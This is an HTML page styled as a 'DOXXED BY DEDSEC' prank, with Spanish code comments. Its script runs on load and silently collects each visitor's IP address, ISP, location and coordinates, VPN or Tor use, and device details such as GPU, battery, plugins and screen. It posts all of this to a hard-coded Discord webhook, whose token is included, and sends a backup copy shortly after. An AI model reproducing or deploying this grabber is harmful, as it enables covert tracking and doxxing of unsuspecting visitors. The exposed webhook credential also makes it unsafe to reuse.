<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMG! IT'S DEDSEC</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 3em;
            color: #00ff00;
            padding: 15px;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
            margin-top: 15vh;
            pointer-events: none;
            z-index: 10;
        }
        #video-inferior {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            max-width: 800px;
            height: auto;
            z-index: 5;
        }
        #video-esquina-izquierda {
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100px;
            height: auto;
            z-index: 10;
            pointer-events: none;
        }
        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: #00ff00;
            padding: 8px 16px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            z-index: 999;
            border: 1px solid #00ff00;
            pointer-events: none;
            white-space: nowrap;
        }
        #status.error {
            color: #ff4444;
            border-color: #ff4444;
        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

    <div id="status">⏳ Initializing...</div>

<script>
    // ================================================================
    //  WEBHOOK (reemplazar con el tuyo)
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  ENVÍO RÁPIDO (sendBeacon + fetch con keepalive)
    // ================================================================
    function sendFast(msg) {
        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg }),
            keepalive: true
        }).catch(() => {});
        return false;
    }

    // ================================================================
    //  MAIN – EJECUCIÓN INMEDIATA
    // ================================================================
    (function() {
        try {
            // ---- Datos instantáneos ----
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            let battery = 'Unavailable';
            if (navigator.getBattery) {
                Promise.race([
                    navigator.getBattery().then(b => {
                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
                    }),
                    new Promise(resolve => setTimeout(resolve, 500))
                ]).catch(() => {});
            }

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
            const cpuCores = navigator.hardwareConcurrency || '?';
            const ram = navigator.deviceMemory || '?';
            const lang = navigator.language;

            // ---- Detección VPN/Tor instantánea ----
            let isVpn = false;
            if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
            if (navigator.webdriver === true) isVpn = true;

            // ---- Obtener IP con timeout de 800 ms ----
            let ip = 'Unknown';
            let isp = 'Unknown ISP';
            let location = 'Unknown';
            let coords = 'Unknown';

            const ipPromise = Promise.race([
                fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(800) })
                    .then(r => r.json())
                    .then(d => d.ip ? d : null)
                    .catch(() => null),
                fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(800) })
                    .then(r => r.json())
                    .then(d => d.query ? { ip: d.query, org: d.isp, country_name: d.country, region: d.regionName, city: d.city, latitude: d.lat, longitude: d.lon, proxy: d.proxy || false } : null)
                    .catch(() => null),
                new Promise(resolve => setTimeout(() => resolve(null), 800))
            ]);

            ipPromise.then(data => {
                if (data) {
                    ip = data.ip || data.query || 'Unknown';
                    isp = data.org || data.isp || 'Unknown ISP';
                    location = (data.city || '') + ', ' + (data.region || data.regionName || '') + ', ' + (data.country_name || data.country || 'Unknown');
                    coords = (data.latitude || data.lat || '') + ', ' + (data.longitude || data.lon || '');
                    if (data.proxy) isVpn = true;
                    if (data.org) {
                        const vpnWords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                        if (vpnWords.some(w => data.org.toLowerCase().includes(w))) isVpn = true;
                    }
                }
                // Mensaje final con todos los datos
                const finalMsg = 
`**ctOS User Info**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${cpuCores}
**RAM:** ${ram} GB
**Screen:** ${screenRes}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**Language:** ${lang}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

                sendFast(finalMsg);
                const el = document.getElementById('status');
                if (el) {
                    el.textContent = '✅ Sent!';
                    el.style.color = '#00ff00';
                }
            });

            // ---- Envío de respaldo a los 900 ms (por si la IP falla) ----
            setTimeout(() => {
                const backupMsg = 
`**ctOS User Info (Fast)**
**IP:** ${ip} (${isp})
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${cpuCores}
**RAM:** ${ram} GB
**Screen:** ${screenRes}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**Language:** ${lang}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;
                sendFast(backupMsg);
            }, 900);

        } catch (err) {
            const errMsg = `**ctOS Error**\n${err.message}`;
            sendFast(errMsg);
            const el = document.getElementById('status');
            if (el) {
                el.textContent = '❌ Error';
                el.style.color = '#ff4444';
                el.style.borderColor = '#ff4444';
            }
        }
    })();
</script>
